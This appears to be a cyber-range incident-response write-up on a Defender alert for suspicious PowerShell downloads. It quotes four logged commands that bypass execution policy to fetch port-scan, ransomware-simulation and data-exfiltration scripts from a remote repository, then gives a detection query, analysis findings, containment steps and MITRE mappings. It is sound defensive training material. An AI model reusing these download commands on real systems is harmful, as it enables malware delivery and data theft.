# Incident Response: Suspicious PowerShell Web Requests

## 🕵️ Detection and Analysis

An incident titled **“kelsier - PowerShell Suspicious Web Request”** was triggered in Microsoft Defender for Endpoint (MDE).  

Upon investigation, the following suspicious PowerShell commands were identified on device **6th-c9300**. The commands executed downloads of four separate scripts from a public GitHub repository:


![PowerShell Suspicious Web Request Investigation](incident-response/images/powershell-suspicious-web-request-1.png)




```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
```



The affected user stated they attempted to install free software around the same time. They observed a black screen for a few seconds, after which “nothing happened.”

**Confirmation of Execution**

Using DeviceProcessEvents in MDE, the investigation confirmed that these downloaded scripts were indeed executed:

```kql
let TargetHostname = "6th-c9300";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine
```


![Sentinel Analytics Rule Setup](incident-response/images/powershell-suspicious-web-request-3.png)




![Process CommandLine Evidence](incident-response/images/powershell-suspicious-web-request-2.png)




**🧪 Malware Analysis Results**

The scripts were escalated to the malware reverse engineering team. Their findings were as follows:

**portscan.ps1** → Conducts an IP range scan for common ports, logging discovered services.

**eicar.ps1** → Generates the EICAR test string to validate AV detection.

**exfiltratedata.ps1** → Simulates data exfiltration by creating fake employee data, compressing it, and uploading to Azure Blob storage.

**pwncrypt.ps1** → Simulates ransomware by encrypting fake Desktop files and generating ransom instructions.




**🛡 Containment, Eradication, and Recovery**

**Containment**: Isolated the machine in Microsoft Defender for Endpoint.

**Eradication**: Ran a full anti-malware scan.

**Recovery**: Once clean, the machine was removed from isolation and returned to production.




**📘 Post-Incident Activities**

User was enrolled in additional cybersecurity awareness training.

The security team upgraded the corporate training package (KnowBe4) and increased training frequency.

Initiated a new policy restricting PowerShell access to essential personnel only, reducing attack surface for script-based threats.



**🔎 MITRE ATT&CK Mapping**

**T1059.001** – Command and Scripting Interpreter: PowerShell

**T1105** – Ingress Tool Transfer (downloading malicious scripts)

**T1560** – Archive Collected Data (simulated in exfiltration script)

**T1486** – Data Encrypted for Impact (simulated ransomware)

**T1046** – Network Service Scanning (port scanning activity)

